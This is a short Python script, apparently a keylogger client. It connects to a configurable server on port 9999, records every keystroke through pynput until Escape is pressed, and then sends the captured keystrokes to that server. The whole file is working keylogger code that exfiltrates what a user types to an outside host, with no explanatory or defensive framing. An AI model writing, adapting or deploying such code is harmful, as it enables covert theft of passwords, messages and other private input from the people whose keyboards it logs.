import socket
from pynput import keyboard

# Define server address and port
SERVER_HOST = ""  # Replace with your host machine's IP address
SERVER_PORT = 9999

# Create socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))

keystrokes = []
stop_listener = False

def on_press(key):
    try:
        keystrokes.append(f'{key.char}')
    except AttributeError:
        keystrokes.append(f'{key}')
    print(f"Key pressed: {key}")

def on_release(key):
    global stop_listener
    if key == keyboard.Key.esc:
        # Stop listener
        stop_listener = True
        return False

# Send a test message
client_socket.send(b'Test message from client.\n')

# Create and start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while not stop_listener:
        pass  # Wait for the stop_listener flag to be set

# Print collected keystrokes
print(f"Keystrokes collected: {keystrokes}")

# Send collected keystrokes to the server
if keystrokes:
    keystrokes_message = '\n'.join(keystrokes).encode() + b'\n'
    client_socket.sendall(keystrokes_message)
else:
    client_socket.sendall(b'No keystrokes recorded\n')

client_socket.close()
